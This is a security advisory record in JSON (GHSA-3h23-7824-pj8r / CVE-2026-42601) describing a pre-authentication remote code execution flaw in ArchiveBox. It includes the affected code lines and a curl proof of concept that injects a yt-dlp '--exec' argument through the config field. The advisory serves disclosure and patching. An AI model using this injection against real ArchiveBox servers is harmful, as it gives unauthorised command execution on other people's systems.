@@ -1,0 +1,73 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-3h23-7824-pj8r",
+  "modified": "2026-07-07T13:05:55Z",
+  "published": "2026-05-04T21:30:19Z",
+  "aliases": [
+    "CVE-2026-42601"
+  ],
+  "summary": "ArchiveBox Vulnerable to RCE via unvalidated per-crawl config overrides in AddView",
+  "details": "The /add/ endpoint (AddView in core/views.py) accepts a config JSON field that gets merged into the crawl config without validation. This config is exported as environment variables when archive plugins run, allowing injection of arbitrary tool arguments to achieve RCE.\n\nWhen PUBLIC_ADD_VIEW=True (common for bookmarklet usage), this is exploitable without authentication. The endpoint is also @csrf_exempt.\n\nAffected code:\n\ncore/views.py:887 - user config extracted with no validation:\n  custom_config = form.cleaned_data.get(\"config\") or {}\n\ncore/views.py:918 - merged into crawl config:\n  config.update(custom_config)\n\nconfig/configset.py:255-256 - crawl config applied with high priority:\n  if crawl and hasattr(crawl, \"config\") and crawl.config:\n      config.update(crawl.config)\n\nhooks.py:398-411 - config exported as env vars:\n  for key, value in config.items():\n      if key in SKIP_KEYS: continue\n      env[key] = str(value)\n\nplugins/ytdlp/on_Snapshot__02_ytdlp.bg.py:122-123 - env var args passed to yt-dlp:\n  ytdlp_args_extra = get_env_array(\"YTDLP_ARGS_EXTRA\", [])\n  cmd.extend(ytdlp_args_extra)\n\nPoC (pre-auth when PUBLIC_ADD_VIEW=True):\n\n  curl -X POST http://localhost:8000/add/ \\\n    -d \"url=https://www.youtube.com/watch?v=dQw4w9WgXcQ\" \\\n    -d \"depth=0\" \\\n    -d \"config={\\\"YTDLP_ARGS_EXTRA\\\": \\\"[\\\\\\\"--exec\\\\\\\", \\\\\\\"id > /tmp/pwned\\\\\\\"]\\\"}\" \n\nAfter the crawl runs, yt-dlp executes id > /tmp/pwned via its --exec flag.\n\nSame approach works with GALLERYDL_ARGS_EXTRA (gallery-dl --exec), or overriding any *_BINARY key.\n\nImpact: Remote code execution on the ArchiveBox server. Pre-auth when PUBLIC_ADD_VIEW=True.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    },
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "archivebox"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "0.8.6rc0"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/ArchiveBox/ArchiveBox/security/advisories/GHSA-3h23-7824-pj8r"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-42601"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/ArchiveBox/ArchiveBox"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pypa/advisory-database/tree/main/vulns/archivebox/PYSEC-2026-283.yaml"
+    },
+    {
+      "type": "WEB",
+      "url": "https://pypi.org/project/archivebox"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-88"
+    ],
+    "severity": "CRITICAL",
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-05-04T21:30:19Z",
+    "nvd_published_at": "2026-05-09T20:16:29Z"
+  }
+}
